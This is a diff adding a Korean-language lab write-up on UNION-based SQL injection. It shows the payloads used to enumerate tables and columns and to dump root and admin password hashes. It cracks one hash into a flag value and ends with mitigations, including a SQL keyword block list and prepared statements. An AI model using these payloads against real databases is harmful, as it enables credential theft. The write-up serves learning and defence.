@@ -1,0 +1,51 @@
+[UNION Based SQL injection]
+
+이 기법은 개발자가 의도한 SQL query를 False로 만들고, 공격자가 의도한 Union SQL query를 활성화시키는 방법이다.
+이는 게시판 목록이 있는 웹 서비스에서 사용하기 쉽다.
+
+# 테이블 스키마와 이름 알아내기
+5 UNION SELECT table_schema, table_name FROM information_schema.tables
+
+ID: 5 UNION SELECT table_schema, table_name FROM information_schema.tables 
+First name: Member_Brute_Force
+Surname : db_default
+
+# 컬럼 스키마에서 테이블 명과 컬럼 명 추출
+5 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns
+
+ID: 5 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns 
+First name: db_default
+Surname : username
+ID: 5 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns 
+First name: db_default
+Surname : password
+
+# db_default에서 username & password 조회
+5 UNION SELECT username, password FROM db_default
+
+Table 'Member_Sql_Injection.db_default' doesn't exist
+
+5 UNION SELECT username, password FROM Member_Brute_Force.db_default
+
+ID: 5 UNION SELECT username, password FROM  Member_Brute_Force.db_default 
+First name: root
+Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+ID: 5 UNION SELECT username, password FROM  Member_Brute_Force.db_default 
+First name: admin
+Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+(https://hashes.com/en/decrypt/hash)
+(https://emn178.github.io/online-tools/sha256.html)
+
+decode  3bf1114a986ba87ed28fc1b5884fc2f8 in md5 -> shadow -> encrypt shadow in sha256 -> 0bb09d80600eec3eb9d7793a6f859bedde2a2d83899b70bd78e961ed674b32f4
+
+1) 입력값 검증
+사용자의 입력이 DB Query에 동적으로 영향을 주는 경우 입력된 값이 개발자가 의도한 값(요효값) 인지 검증합니다.
+
+/*, –, ‘, “, ?, #, (, ), ;, @, =, *, +, union, select, drop, update, from, where, join, substr, user_tables, user_table_columns, information_schema, sysobject, table_schema, declare, dual,…
+
+2) MySQL 에러 메시지 노출 차단
+
+3) Prepared Statement로 input 정제해 악성 query 거르기
+# https://m.blog.naver.com/PostView.nhn?blogId=blogpyh&logNo=220675109307&proxyReferer=https:%2F%2Fwww.google.com%2F
+# prepared statement 최초 1회만 파싱하고 변수에 단순히 inpu만 바인딩하기 때문에 악성 쿼리가 들어와도 기능을 못 한다.
